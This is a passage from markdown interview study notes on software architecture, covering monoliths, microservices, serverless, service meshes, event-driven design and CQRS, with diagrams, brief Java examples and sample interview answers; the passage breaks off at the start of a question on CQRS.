# Architecture, Reliability and Security

> **Part 6 of 10** in the System Design interview notes. See [README](README.md) for the roadmap.
> **What you'll learn:** how to structure a system (monolith, microservices, serverless, event-driven, CQRS, event sourcing), how to keep it running when parts fail, how to deploy safely, how to see inside it (observability), and how to secure it (authentication, authorization, encryption, secrets, disaster recovery).
> **Level legend:** 🟢 Essential (asked in almost every interview) · 🟡 Intermediate · 🔴 Advanced / senior
> **Related:** [Distributed Systems and Messaging](05_distributed_systems_and_messaging.md) · [Networking and Communication](02_networking_and_communication.md) · [Databases and Storage](03_databases_and_storage.md) · [Interview Prep and Cheat Sheet](09_interview_prep_and_cheatsheet.md)

---

## Table of Contents

1. [Architecture Styles](#1-architecture-styles)
   - [1.1 Monolith](#11-monolith) · [1.2 Modular Monolith](#12-modular-monolith) · [1.3 Microservices](#13-microservices) · [1.4 Finding Service Boundaries](#14-finding-service-boundaries) · [1.5 Serverless](#15-serverless) · [1.6 Comparing Architecture Styles](#16-comparing-architecture-styles) · [1.7 Migrating with the Strangler Fig](#17-migrating-with-the-strangler-fig)
2. [Microservices Building Blocks](#2-microservices-building-blocks)
   - [2.1 Database per Service](#21-database-per-service) · [2.2 API Composition](#22-api-composition) · [2.3 Inter-Service Communication](#23-inter-service-communication) · [2.4 Sidecar Pattern](#24-sidecar-pattern) · [2.5 Service Mesh](#25-service-mesh) · [2.6 Architecture Anti-Patterns](#26-architecture-anti-patterns)
3. [Event-Driven Architecture](#3-event-driven-architecture)
4. [CQRS](#4-cqrs)
5. [Event Sourcing](#5-event-sourcing)
6. [Designing for Failure](#6-designing-for-failure)
   - [6.1 Failure Modes Catalog](#61-failure-modes-catalog) · [6.2 Cascading Failures](#62-cascading-failures) · [6.3 Graceful Degradation](#63-graceful-degradation) · [6.4 Load Shedding and Prioritization](#64-load-shedding-and-prioritization) · [6.5 Failover](#65-failover) · [6.6 Multi-AZ and Multi-Region](#66-multi-az-and-multi-region) · [6.7 Health Checks](#67-health-checks)
7. [Deployment Strategies](#7-deployment-strategies)
8. [Observability](#8-observability)
   - [8.1 The Three Pillars](#81-the-three-pillars) · [8.2 Logging](#82-logging) · [8.3 Metrics](#83-metrics) · [8.4 Prometheus and Grafana](#84-prometheus-and-grafana) · [8.5 Distributed Tracing](#85-distributed-tracing) · [8.6 Alerting](#86-alerting)
9. [SLI, SLO, SLA and Error Budgets](#9-sli-slo-sla-and-error-budgets)
10. [Authentication and Authorization](#10-authentication-and-authorization)
    - [10.1 AuthN vs AuthZ](#101-authn-vs-authz) · [10.2 Sessions vs Tokens](#102-sessions-vs-tokens) · [10.3 JWT](#103-jwt) · [10.4 OAuth 2.0](#104-oauth-20) · [10.5 OpenID Connect and SSO](#105-openid-connect-and-sso) · [10.6 RBAC and ABAC](#106-rbac-and-abac) · [10.7 Multi-Tenant Authentication](#107-multi-tenant-authentication) · [10.8 Service-to-Service Authentication](#108-service-to-service-authentication)
11. [Security Fundamentals](#11-security-fundamentals)
    - [11.1 Security Principles](#111-security-principles) · [11.2 Encryption](#112-encryption) · [11.3 Password Hashing](#113-password-hashing) · [11.4 Secrets Management](#114-secrets-management) · [11.5 Common Attacks and Defenses](#115-common-attacks-and-defenses) · [11.6 Security Headers](#116-security-headers)
12. [Disaster Recovery, Backups, RTO and RPO](#12-disaster-recovery-backups-rto-and-rpo)
13. [Quick Revision](#13-quick-revision)

---

## 1. Architecture Styles

> **Theme:** Choose your architecture based on team size, product maturity, and operational capability — not hype.

An **architecture style** is the overall shape of your system: how code is split into deployable units, how those units talk, and who owns which data. The decision is mostly about **who has to coordinate with whom** to ship a change, and **what fails together**.

### 1.1 Monolith

> **Level:** 🟢 Essential

**What is it?** A monolithic architecture is one where all components of an application — UI, business logic, data access — are built, deployed, and scaled as a **single unit** (one JAR/WAR, one process, usually one database).

**Why do we need it?** It is the simplest way to build software. Calls between modules are plain in-process method calls (nanoseconds, no network failures), there is one thing to deploy, and one database gives you ACID transactions across the whole domain for free.

```mermaid
flowchart TD
    client["Web / Mobile Client"] --> lb["Load Balancer"]
    lb --> app1["Monolith instance 1"]
    lb --> app2["Monolith instance 2"]
    subgraph mono["Inside one deployable artifact"]
        user["User module"]
        order["Order module"]
        pay["Payment module"]
    end
    app1 -.-> mono
    app1 --> db[("Single database")]
    app2 --> db
```

**Walkthrough:**
1. Every instance contains the *entire* application (user, order, payment modules).
2. A load balancer spreads requests across identical copies — yes, monoliths can scale horizontally if they are stateless.
3. All instances share one database, so a single transaction can update users, orders, and payments atomically.
4. **Failure/bottleneck:** a memory leak in the payment module crashes the whole process, taking users and orders down with it. And if only search is hot, you must scale *everything* to scale search.

**Advantages and disadvantages**

| Pros | Cons |
|---|---|
| Simple to develop initially | Deployment risk — one change deploys everything |
| Easy to test end-to-end | Cannot scale individual components independently |
| No network latency between modules | Codebase tends to become a "big ball of mud" |
| Single deployment, single DB transactions | Long build and test cycles as it grows |
| Easier debugging (one stack trace) | Technology lock-in — one stack for all |

**When to use it:** early-stage product, small team (< ~10 engineers), MVP, unclear domain boundaries, or whenever the operational cost of microservices would slow you down.

**Common mistakes**
- Believing "monolith = cannot scale". Stack Overflow and Shopify ran very large monoliths. A stateless monolith behind a load balancer plus caching and read replicas goes a long way.
- Letting the monolith rot without internal boundaries — that is the real problem, and the fix is a *modular* monolith, not necessarily microservices.

### 1.2 Modular Monolith

> **Level:** 🟢 Essential

**What is it?** A single deployable application internally organized into **well-defined, loosely coupled modules** with clear boundaries and explicit interfaces — but without the network overhead of microservices.

**Why do we need it?** It keeps the operational simplicity of a monolith while enforcing the domain boundaries that make future extraction into microservices cheap. Most "we need microservices" pain is actually "our modules are tangled" pain.

**How does it work?**
1. Split code by **business capability** (user, order, payment), not by technical layer (controllers, services, repositories).
2. Each module exposes a small **public API** (interfaces / facade) and hides everything else (package-private classes, its own tables or schema).
3. Modules call each other only through those public APIs or via in-process events.
4. Enforce boundaries with tooling (ArchUnit tests, Java modules, Spring Modulith) so violations fail the build.

```mermaid
flowchart LR
    subgraph app["Single deployable - Modular Monolith"]
        subgraph um["User module"]
            uapi["UserApi (public)"]
            urepo["UserRepository (internal)"]
        end
        subgraph om["Order module"]
            oapi["OrderApi (public)"]
            orepo["OrderRepository (internal)"]
        end
        subgraph pm["Payment module"]
            papi["PaymentApi (public)"]
        end
    end
    oapi -->|"allowed"| uapi
    oapi -->|"allowed"| papi
    oapi -.->|"forbidden"| urepo
    urepo --> s1[("user schema")]
    orepo --> s2[("order schema")]
```

**Example (Java / Spring):**

```
com.company.user      → UserModule (owns User domain)
com.company.order     → OrderModule (owns Order domain)
com.company.payment   → PaymentModule (owns Payment domain)

// Cross-module call — only through interface, never through repo
OrderService calls userApi.getUserById(userId)      ✅
OrderService calls userRepository.findById(userId)  ❌ (breaks boundary)
```

```java
// user module — the ONLY type other modules may depend on
package com.company.user;

public interface UserApi {
    UserSummary getUserById(String userId);
}

// internal implementation is package-private
class UserApiImpl implements UserApi {
    private final UserRepository repo;   // package-private, invisible outside
    UserApiImpl(UserRepository repo) { this.repo = repo; }
    public UserSummary getUserById(String id) {
        return repo.findById(id).map(UserSummary::from).orElseThrow();
    }
}

// ArchUnit test that fails the build on boundary violations
@ArchTest
static final ArchRule ordersDoNotTouchUserInternals =
    noClasses().that().resideInAPackage("..order..")
        .should().dependOnClassesThat().haveSimpleName("UserRepository");
```

**Interview perspective**
> **Q: What's the difference between a monolith and a modular monolith?**
> A plain monolith often has no internal structure — everything calls everything. A modular monolith is still one deployable artifact, but organized into bounded modules that talk only through public interfaces and own their own data (separate schemas). You keep in-process calls and single-DB transactions, while building the boundaries that make extracting a microservice later a mechanical change rather than a rewrite.

**Quick revision**
- One deployable, many enforced internal boundaries.
- Split by business capability; each module owns its tables.
- Enforce with ArchUnit / Spring Modulith — boundaries that aren't enforced erode.
- Best default for growing teams; the stepping stone to microservices.

### 1.3 Microservices

> **Level:** 🟢 Essential

**What is it?** An architecture that structures an application as a collection of **small, independently deployable services**, each owning its own data, responsible for one business capability, and communicating over the network (HTTP/gRPC or messaging).

**Why do we need it?** At scale, the bottleneck is usually people, not CPUs. When 200 engineers share one codebase and one release train, every deploy needs coordination. Microservices let each team deploy, scale, and choose technology **independently**.

```mermaid
flowchart TD
    client["Clients"] --> gw["API Gateway"]
    gw --> us["User Service"]
    gw --> os["Order Service"]
    gw --> ps["Payment Service"]
    us --> udb[("MySQL")]
    os --> odb[("PostgreSQL")]
    ps --> pdb[("MongoDB")]
    os -->|"publish OrderPlaced"| bus[["Message broker"]]
    bus --> ps
    bus --> ns["Notification Service"]
```

**Walkthrough:**
1. The [API Gateway](02_networking_and_communication.md#13-api-gateway-and-bff) is the single entry point (auth, rate limits, routing).
2. Each service owns its database — nobody else may read its tables.
3. Services that need to react to each other prefer async events through a broker (loose coupling in time).
4. **Failure:** if Payment Service is down, the Gateway can still serve users and orders; orders wait in `PENDING` until payment events are processed. That fault isolation is the payoff — but only if you add timeouts, circuit breakers, and async messaging (see [section 6](#6-designing-for-failure)).

**Advantages and disadvantages**

| Pros | Cons |
|---|---|
| Independent deployment of each service | Network latency and partial failures between services |
| Independent scaling per service | Distributed systems complexity (retries, idempotency, ordering) |
| Technology heterogeneity (polyglot) | Harder to test end-to-end |
| Fault isolation (when done right) | Operational overhead: monitoring, tracing, CI/CD per service |
| Team autonomy (Conway's Law) | No ACID across services — need sagas, eventual consistency |

**Conway's Law:** *"Organizations design systems that mirror their communication structure."* Microservices work best when **team boundaries match service boundaries** — one team owns one or a few services end-to-end. The "Inverse Conway Maneuver" is deliberately shaping teams to get the architecture you want.

**The microservices tax** — you pay for all of this before you get any benefit:
- Service discovery infrastructure ([05 §8](05_distributed_systems_and_messaging.md#8-service-discovery))
- Distributed tracing and centralized logging
- API gateway
- Per-service CI/CD pipelines
- Container orchestration (Kubernetes)
- Distributed transaction handling ([sagas](05_distributed_systems_and_messaging.md#18-distributed-transactions-2pc-vs-saga))
- Network monitoring, alerting, on-call per service
- Contract versioning between services

**When to use it:** the product and domain are reasonably stable, there are multiple teams (roughly 10+ engineers per domain is a common heuristic), you have DevOps/platform capability, and a specific pain exists: deploy contention, wildly different scaling needs per component, or fault isolation requirements.

**Interview perspective**
> **Q: When should you NOT use microservices?**
> When you're early and still discovering domain boundaries — wrong boundaries are very expensive to fix across network and data ownership lines. When the team is small — the microservices tax (CI/CD, tracing, orchestration, on-call) eats your velocity. And when there is no concrete scaling or deployment problem they would solve. I'd start with a modular monolith and extract services when a module has a clear reason: independent scaling, a different release cadence, or a separate owning team.

> *"Microservices solve organizational problems as much as technical ones. Don't adopt them until your monolith is actually hurting you."*

**Common mistakes**
- **Distributed monolith:** services that must be deployed together, share a database, or call each other synchronously in long chains. You get all the costs and none of the benefits.
- Splitting by technical layer ("DB service", "validation service") instead of by business capability.
- Making services too small ("nano-services") — every request becomes 15 network hops.

**Quick revision**
- Independent deploy + own data + one business capability.
- Benefit is mostly organizational; cost is distributed-systems complexity.
- Align service boundaries with team boundaries (Conway).
- Beware the distributed monolith.

### 1.4 Finding Service Boundaries

> **Level:** 🟡 Intermediate

**What is it?** Deciding *where to cut* the system. The standard tool is **Domain-Driven Design (DDD)**, specifically the **bounded context**: a boundary inside which a domain term has one precise meaning and one model.

**Why it matters:** The word "Product" means different things to Catalog (title, images, description), Inventory (SKU, stock count, warehouse), and Pricing (base price, discounts). Forcing one shared `Product` model on all three couples them. Giving each context its own model lets them evolve independently.

**How to do it:**
1. **Event storming:** list the domain events on a timeline (`OrderPlaced`, `PaymentCaptured`, `ShipmentDispatched`).
2. Group events and the commands that cause them into clusters — these clusters are candidate bounded contexts.
3. Check **cohesion**: things that change together should live together.
4. Check **coupling**: if two candidates need synchronous chatty calls for every request, they probably belong together.
5. Check **data ownership**: each piece of data should have exactly one owning service (the "source of truth").
6. Map the result to teams.

```mermaid
flowchart LR
    subgraph catalog["Catalog context"]
        c1["Product: title, images, description"]
    end
    subgraph inventory["Inventory context"]
        i1["StockItem: sku, qty, warehouse"]
    end
    subgraph pricing["Pricing context"]
        p1["Price: sku, base, discounts"]
    end
    catalog -->|"ProductCreated event"| inventory
    catalog -->|"ProductCreated event"| pricing
```

**Heuristics interviewers like:**
- "Things that change together, stay together."
- "If two services always deploy together, they are one service."
- "Prefer a few coarse services and split later; merging services is harder than splitting a module."

### 1.5 Serverless

> **Level:** 🟡 Intermediate

**What is it?** An execution model where the cloud provider manages servers entirely. You deploy **functions** (FaaS — Function as a Service) that are triggered by events, scale automatically (including **to zero** when idle), and are billed per invocation/duration.

**How does it work?**

```mermaid
flowchart LR
    http["HTTP request"] --> trig["Provider: trigger, provision, scale"]
    s3["S3 file upload"] --> trig
    queue["Queue message"] --> trig
    cron["Scheduled cron"] --> trig
    trig --> fn["Your function runs ms to minutes"]
    fn --> out["Response or side effect"]
    fn -.->|"idle"| zero["Instances torn down - scale to zero"]
```

1. An event arrives (HTTP via API Gateway, file upload, queue message, schedule).
2. The provider finds a warm container or creates a new one (**cold start**).
3. Your function runs, returns, and the container may be reused for later events or torn down.

**Examples:** AWS Lambda, Google Cloud Functions, Azure Functions; also "serverless containers" (Cloud Run, Fargate) and serverless databases (DynamoDB, Aurora Serverless).

| Pros | Cons |
|---|---|
| No server management | Cold start latency on first invocation |
| Auto-scales, including to zero | Max execution time (15 min on Lambda) |
| Pay per execution | Poor fit for long-running or stateful processes |
| Rapid deployment | Vendor lock-in |
| Event-driven by nature | Debugging, local testing, tracing are harder |
| | Can get expensive at constant high load; can overwhelm downstream DBs (connection storms) |

**Use cases:** image processing on upload, scheduled jobs (cron replacements), webhook handlers, APIs with spiky/unpredictable traffic, event-driven data pipelines, glue code.

**Cold start:** when a function hasn't been called recently, the provider must start a container, runtime, and your init code (~100 ms to several seconds; JVM functions are on the slow end). Mitigate with: provisioned concurrency (keep N instances warm), smaller deployment packages and fewer dependencies, lighter runtimes (Go, Node.js) or JVM optimizations (AWS SnapStart, GraalVM native image), and lazy initialization.

**Common mistake:** connecting thousands of concurrent Lambdas directly to a relational DB — each opens connections and exhausts the DB. Use a connection proxy (RDS Proxy) or a queue in front.

### 1.6 Comparing Architecture Styles

> **Level:** 🟢 Essential

| Dimension | Monolith | Modular Monolith | Microservices | Serverless |
|---|---|---|---|---|
| Deployment | Single unit | Single unit | Per service | Per function |
| Scaling | All or nothing | All or nothing | Per service | Automatic, per function |
| Data | One DB | One DB, schema per module | DB per service | Usually managed DBs |
| Cross-module transaction | ACID | ACID | Saga / eventual | Saga / eventual |
| Complexity | Low | Medium | High | Medium–High |
| Team size | Small | Small–Medium | Large, many teams | Any |
| Operational overhead | Low | Low | Very high | Low (but observability harder) |
| Best for | MVPs, startups | Growing teams | Large orgs, independent scaling | Event-driven, spiky tasks |

> **Strong interview line:** "I'd start with a modular monolith, keep data separated per module, and extract a service only when it has a concrete reason — different scaling profile, release cadence, or owning team."

### 1.7 Migrating with the Strangler Fig

> **Level:** 🟡 Intermediate

**What is it?** A migration pattern (named after a vine that slowly grows around a tree) where you **incrementally replace** pieces of a legacy monolith with new services, routing traffic for each piece to the new implementation until the old one can be deleted. It avoids the risky "big-bang rewrite".

**How does it work?**
1. Put a routing layer (API gateway / reverse proxy) in front of the monolith.
2. Pick one capability with clear boundaries (e.g., notifications).
3. Build the new service; sync data (dual-write via events or [CDC](05_distributed_systems_and_messaging.md#19-transactional-outbox-and-cdc)).
4. Route a small percentage of that capability's traffic to the new service (canary), compare results.
5. Shift 100%, then delete the old code from the monolith.
6. Repeat.

```mermaid
flowchart LR
    client["Clients"] --> router["Gateway / Router"]
    router -->|"/notifications - 100%"| ns["New Notification Service"]
    router -->|"/orders - 10% canary"| os["New Order Service"]
    router -->|"/orders - 90%"| mono["Legacy Monolith"]
    router -->|"everything else"| mono
    mono -->|"CDC events"| os
```

**Trade-off:** slower than a rewrite on paper, but every step is reversible and delivers value. The routing layer and data sync are temporary complexity you must eventually remove.

---

## 2. Microservices Building Blocks

> **Theme:** Microservices introduce new problems. These patterns solve them.

### 2.1 Database per Service

> **Level:** 🟢 Essential

**What is it?** Each microservice owns its own database (or at least its own schema), and **no other service may access it directly**. Cross-service data access goes through the owning service's API or through events.

**Why do we need it?** If services share tables, a schema change by one team breaks others, and services can't be deployed independently — you've built a distributed monolith.

```mermaid
flowchart TB
    subgraph bad["Anti-pattern - Shared Database"]
        u1["User Service"] --> shared[("Shared DB")]
        o1["Order Service"] --> shared
        p1["Payment Service"] --> shared
    end
    subgraph good["Pattern - Database per Service"]
        u2["User Service"] --> udb[("User DB - MySQL")]
        o2["Order Service"] --> odb[("Order DB - PostgreSQL")]
        p2["Payment Service"] --> pdb[("Payment DB - MongoDB")]
        o2 -->|"API call"| u2
    end
```

**Walkthrough:**
- **Shared DB:** schema changes affect all services; services are coupled at the data layer; they cannot deploy independently; one service's slow query hurts everyone.
- **DB per service:** each service controls its schema, deploys independently, and can choose the right database type (polyglot persistence).

**Challenges and solutions**

| Challenge | Solution |
|---|---|
| Joining data across services | API composition (§2.2) or a read model built from events ([CQRS](#4-cqrs)) |
| Distributed transactions | [Saga pattern](05_distributed_systems_and_messaging.md#18-distributed-transactions-2pc-vs-saga) with compensating actions |
| Data duplication | Accept it — keep local read-only copies synced via events |
| Reliable "update DB + publish event" | [Transactional outbox](05_distributed_systems_and_messaging.md#19-transactional-outbox-and-cdc) |
| Reporting across services | Separate analytics store / data warehouse fed by event streams or CDC |

**Data access pattern:**

```java
// OrderService needs the user's email for a notification
// ❌ Wrong: directly query the user DB
String email = userDatabase.query("SELECT email FROM users WHERE id = ?", userId);

// ✅ Right: call the UserService API (or use a locally cached copy kept fresh by UserUpdated events)
UserDTO user = userServiceClient.getUser(userId);
String email = user.getEmail();
```

**Common mistake:** "database per service" doesn't require a separate database *server* per service — separate schemas with separate credentials on one cluster is a valid, cheaper start. What matters is that no service reads another's tables.

### 2.2 API Composition

> **Level:** 🟡 Intermediate

**What is it?** A component (gateway, BFF, or a dedicated composer service) that calls several services and **merges their responses** for a query that spans services — the microservices replacement for a SQL join.

```mermaid
sequenceDiagram
    participant C as Client
    participant B as BFF / Composer
    participant O as Order Service
    participant U as User Service
    participant S as Shipping Service
    C->>B: GET /order-details/123
    par fan out in parallel
        B->>O: GET /orders/123
    and
        B->>U: GET /users/42
    and
        B->>S: GET /shipments?order=123
    end
    O-->>B: order
    U-->>B: user
    S-->>B: shipment or timeout
    B-->>C: merged view - shipment marked unavailable if it timed out
```

**Trade-offs:** simple and always fresh, but latency = slowest call, availability = product of all dependencies, and large in-memory joins don't scale. For heavy or frequent cross-service queries, precompute a **read model** with CQRS instead. Always call in parallel with per-call timeouts and return partial results where acceptable.

### 2.3 Inter-Service Communication

> **Level:** 🟢 Essential

Services talk either **synchronously** (request/response: REST, gRPC — caller waits) or **asynchronously** (messages/events via Kafka, RabbitMQ, SQS — caller doesn't wait). Full treatment: [Synchronous vs Asynchronous Communication](05_distributed_systems_and_messaging.md#9-synchronous-vs-asynchronous-communication).

| Use sync when | Use async when |
|---|---|
| The caller needs the answer now (validate a coupon, read a price) | The work can happen later (send email, update analytics) |
| Simple query, low latency | Many consumers need the same fact (fan-out) |
| Strong consistency for that step | You need to absorb spikes or survive consumer downtime |

**Rule of thumb:** sync for queries, async for state changes that other services react to. Every sync call needs a timeout, a retry policy with backoff, and a circuit breaker.

### 2.4 Sidecar Pattern

> **Level:** 🟡 Intermediate

**What is it?** Deploying a helper container **alongside** the main application container in the same deployment unit (a Kubernetes pod). The sidecar handles cross-cutting concerns on behalf of the app, which doesn't need to know about them.

```mermaid
flowchart LR
    subgraph pod["Kubernetes Pod"]
        app["Main App - business logic"]
        side["Sidecar - logging, TLS, metrics, auth proxy"]
        app <-->|"localhost"| side
    end
    side -->|"logs"| logs["Log backend"]
    side -->|"mTLS traffic"| other["Other services"]
```

**Common sidecar uses:**
- **Logging:** collect and forward logs (Fluentd, Fluent Bit, Logstash)
- **Proxy:** intercept network traffic (Envoy, Linkerd proxy)
- **Security:** mutual TLS, certificate rotation
- **Metrics:** collect and expose Prometheus metrics
- **Configuration:** dynamic config/secret refresh (Vault agent)

**Why it helps:** you implement the concern once, in any language, and every service gets it — instead of re-implementing it in Java, Go, Python libraries. **Trade-off:** extra resource usage per pod and an extra network hop (localhost, small).

### 2.5 Service Mesh

> **Level:** 🔴 Advanced

**What is it?** A **service mesh** (Istio, Linkerd, Consul Connect) is "sidecars at scale": a proxy (often Envoy) runs next to every service instance (**data plane**), and a **control plane** configures all proxies centrally.

```mermaid
flowchart TB
    cp["Control plane - Istio istiod: config, certificates, policy"]
    subgraph podA["Pod: Order Service"]
        a["order app"] --- ea["Envoy"]
    end
    subgraph podB["Pod: Payment Service"]
        b["payment app"] --- eb["Envoy"]
    end
    ea <-->|"mTLS, retries, timeouts, tracing"| eb
    cp -.->|"push config and certs"| ea
    cp -.->|"push config and certs"| eb
```

**What you get without changing application code:**
- Automatic **mutual TLS** between all services (encryption + service identity)
- Traffic management: canary splits, retries, timeouts, load balancing
- Circuit breaking and outlier detection
- Uniform metrics and distributed tracing headers

**Trade-offs:** significant operational complexity, added latency per hop (usually sub-millisecond to a few ms), and memory per sidecar. Worth it with dozens+ services and strong security/traffic-control needs; overkill for five services. Newer "sidecar-less" modes (Istio ambient mesh) reduce per-pod overhead.

> **Interview tip:** Don't configure retries both in the app (Resilience4j) and in the mesh — retries multiply (3 × 3 = 9 attempts) and can cause retry storms.

### 2.6 Architecture Anti-Patterns

> **Level:** 🟢 Essential

These come from the original anti-patterns list; they look reasonable at first and cause long-term damage.

| Anti-Pattern | What It Looks Like | Problem | Fix |
|---|---|---|---|
| **Shared Database** | Multiple services read/write the same tables | Schema changes break all services; no independent deploys | Database per service; replicate via events |
| **Chatty Services** | Dozens of small network calls per user request | High latency (each hop adds ms), more failure points | Coarse-grained APIs, batch endpoints, aggregation layer/BFF, local read models |
| **Cascading Failures** | One slow service takes down the entire system | No failure isolation | Timeouts, circuit breaker, bulkhead, graceful degradation ([§6](#6-designing-for-failure)) |
| **Synchronous Everything** | Blocking calls across 5 services per request | Latency adds up; availability multiplies down (0.99^5 ≈ 95%) | Async messaging for anything not needed in the response |
| **Distributed Monolith** | Services must deploy together | All the costs of both styles | Re-draw boundaries; merge services that always change together |
| **Golden Hammer** | "We always use Kafka / microservices" | Wrong tool for the job | Choose based on requirements |

> **Availability math worth remembering:** if a request synchronously depends on N services each with availability A, overall availability ≈ A^N. Five services at 99.9% → ~99.5%. This is why sync chains hurt.

---

## 3. Event-Driven Architecture

> **Theme:** Services announce facts; whoever cares reacts. The producer doesn't know or wait for consumers.

### 3.1 What Is Event-Driven Architecture

> **Level:** 🟢 Essential

**What is it?** An architecture where components communicate by **producing and consuming events** — immutable records of something that already happened (`OrderPlaced`, `PaymentCaptured`). Events flow through a broker (Kafka, RabbitMQ, SNS/SQS, EventBridge). Producers don't know who consumes; consumers subscribe independently.

**Why do we need it?**
- **Decoupling:** adding a new reaction (fraud check, loyalty points) means adding a consumer — no change to the producer.
- **Resilience:** if a consumer is down, events wait in the broker; the producer keeps working.
- **Scalability:** consumers scale independently and absorb spikes at their own pace.
- **Audit and replay:** with a log-based broker (Kafka) you can replay history to rebuild state or backfill a new service.

**How does it work?**

```mermaid
flowchart LR
    os["Order Service"] -->|"OrderPlaced"| topic[["Topic: order-events"]]
    topic --> pay["Payment Service - charge card"]
    topic --> inv["Inventory Service - reserve stock"]
    topic --> notif["Notification Service - send email"]
    topic --> ana["Analytics Service - record sale"]
    pay -->|"PaymentCaptured"| ptopic[["Topic: payment-events"]]
    ptopic --> os
```

1. Order Service commits the order to its DB and publishes `OrderPlaced` (reliably, via the [outbox pattern](05_distributed_systems_and_messaging.md#19-transactional-outbox-and-cdc)).
2. Each subscriber gets its own copy (pub-sub) and does its own work.
3. Subscribers publish their own events (`PaymentCaptured`), which other services — including Order Service — react to, moving the order to `CONFIRMED`.
4. **Failure:** if Notification Service crashes, events accumulate; when it restarts it resumes from its last offset. Messages may be delivered twice, so consumers must be **idempotent** ([05 §13](05_distributed_systems_and_messaging.md#13-delivery-guarantees-idempotency-and-deduplication)).

### 3.2 Events vs Commands

> **Level:** 🟡 Intermediate

| | Event | Command |
|---|---|---|
| Meaning | A fact: something happened | A request: please do something |
| Naming | Past tense: `OrderPlaced` | Imperative: `ChargeCard` |
| Receivers | Zero to many; producer doesn't care | Exactly one intended handler |
| Can it be rejected? | No — it already happened | Yes — handler may refuse |
| Coupling | Low | Higher (sender knows the receiver's purpose) |

**Common mistake:** naming commands as events (`SendEmailEvent`) — that hides a direct dependency inside an "event" and couples producer to consumer.

### 3.3 Event Notification vs Event-Carried State Transfer

> **Level:** 🟡 Intermediate

| Style | Payload | Consumer behavior | Trade-off |
|---|---|---|---|
| **Event notification** | Minimal: `{ "orderId": 123 }` | Calls back the producer's API for details | Small events, always fresh data — but callback traffic re-couples services |
| **Event-carried state transfer** | Full state: order lines, totals, address | Keeps its own local copy, no callback | Fully decoupled, works if producer is down — but bigger events, duplicated data, eventual consistency |

Most mature systems use **event-carried state transfer** for core domain events so consumers can build local read models.

### 3.4 Choreography vs Orchestration

> **Level:** 🟡 Intermediate

- **Choreography:** no central controller; each service reacts to events and emits new ones (diagram in §3.1). Loose coupling, but the end-to-end flow is implicit and harder to trace.
- **Orchestration:** a central orchestrator (a workflow engine like Temporal, Camunda, AWS Step Functions, or a saga orchestrator service) tells each service what to do next. The flow is explicit and easy to monitor, at the cost of a central component.

Detailed comparison in the saga section: [05 §18](05_distributed_systems_and_messaging.md#18-distributed-transactions-2pc-vs-saga).

### 3.5 Schema Evolution and Schema Registry

> **Level:** 🔴 Advanced

Events are a **public contract**, often kept for years (Kafka retention, event stores). Changing them carelessly breaks consumers you may not even know exist.

**Rules for safe evolution:**
1. **Additive changes only** within a version: add optional fields with defaults; never remove or rename a field, never change its type.
2. **Consumers must ignore unknown fields** (tolerant reader).
3. For breaking changes, publish a **new event type / version** (`OrderPlaced.v2`) and run both until consumers migrate.
4. Use a **schema registry** (Confluent Schema Registry, AWS Glue) with Avro, Protobuf, or JSON Schema. Producers register schemas; the registry rejects incompatible changes according to a compatibility mode:

| Mode | Guarantee | Allows |
|---|---|---|
| Backward | New consumers can read old events | Delete fields, add optional fields |
| Forward | Old consumers can read new events | Add fields, delete optional fields |
| Full | Both directions | Add/remove optional fields only |

### 3.6 EDA Pitfalls

> **Level:** 🟡 Intermediate

| Pitfall | Why it hurts | Mitigation |
|---|---|---|
| Lost events (DB commit succeeded, publish failed) | Consumers never learn about the change | Transactional outbox / CDC |
| Duplicate events | Double charge, double email | Idempotent consumers, dedup keys |
| Out-of-order events | `OrderShipped` processed before `OrderPlaced` | Partition by entity key (Kafka), version numbers, ignore stale versions |
| Invisible flows | Nobody knows what happens after `OrderPlaced` | Distributed tracing, event catalog, flow documentation |
| Poison messages | One bad event blocks a partition | Retries with limit, then [DLQ](05_distributed_systems_and_messaging.md#14-dead-letter-queues-and-backpressure) |
| Eventual consistency surprises | User refreshes and doesn't see their order | Read-your-writes in the UI, optimistic updates, show `PENDING` state |

**Interview perspective**
> **Q: When would you choose event-driven over request/response?**
> When the producer doesn't need the result to respond to its caller, when several services must react to the same fact, or when I need to absorb spikes and survive consumer outages. For example, after checkout the user only needs "order received"; payment, inventory, email and analytics can all react to `OrderPlaced` asynchronously. The trade-off is eventual consistency, harder debugging, and the need for idempotent consumers and reliable publishing via an outbox.

**Quick revision**
- Events = past-tense facts; commands = requests to one handler.
- Prefer event-carried state transfer for decoupling.
- Must-haves: outbox, idempotent consumers, ordering by key, DLQ, schema registry, tracing.

---

## 4. CQRS

> **Level:** 🟡 Intermediate

**What is it?** **Command Query Responsibility Segregation** separates the **write model** (commands that change state and enforce business rules) from the **read model** (queries optimized for display), so each can be designed, stored, and scaled independently.

**Why do we need it?** A single model is often bad at both jobs. The write side wants normalized tables and invariants ("stock can't go negative"); the read side wants denormalized, pre-joined data ("product page with price, stock, rating, seller in one lookup"). Read traffic is often 100× write traffic.

**How does it work?**
1. A command (`PlaceOrder`) hits the write side, which validates business rules and saves to the write DB.
2. The write side emits an event (`OrderPlaced`) — via outbox/CDC.
3. A **projector** consumes events and updates one or more **read models** (projections): a search index, a Redis view, a denormalized SQL table.
4. Queries go straight to the read models.

```mermaid
flowchart LR
    client["Client"] -->|"command: PlaceOrder"| cmd["Command side - validate rules"]
    cmd --> wdb[("Write DB - normalized")]
    cmd -->|"OrderPlaced event"| bus[["Event bus"]]
    bus --> proj["Projector"]
    proj --> rdb1[("Read DB - denormalized view")]
    proj --> rdb2[("Search index - Elasticsearch")]
    client -->|"query: GET my orders"| q["Query side"]
    q --> rdb1
    q --> rdb2
```

**Walkthrough of a failure:** if the projector falls behind (lag), queries return slightly stale data — a user may not see an order they just placed. Mitigate with read-your-writes tricks: return the created order in the command response, or read from the write DB for that user for a few seconds.

**Original comparison:**

```
Write Side (Command)       Read Side (Query)
─────────────────          ──────────────────
Validate business rules    Optimized for reads
Save to Write DB           Denormalized Read DB
Emit events        ──→     Subscribe & update read store
```

| Advantages | Disadvantages |
|---|---|
| Read and write sides scale independently | Eventual consistency between models |
| Each side uses the best storage for its job | More moving parts: bus, projectors, multiple stores |
| Complex queries no longer slow down writes | Projections must be rebuilt when their shape changes |
| Natural fit with event sourcing | Overkill for simple CRUD |

**When to use it:** very different read/write loads; complex reporting or search queries; analytics alongside transactional data; multiple different views of the same data (e.g., order list, merchant dashboard, search). **Don't** use it for simple CRUD apps — a read replica or a cache is usually enough.

**Interview perspective**
> **Q: What problem does CQRS solve?**
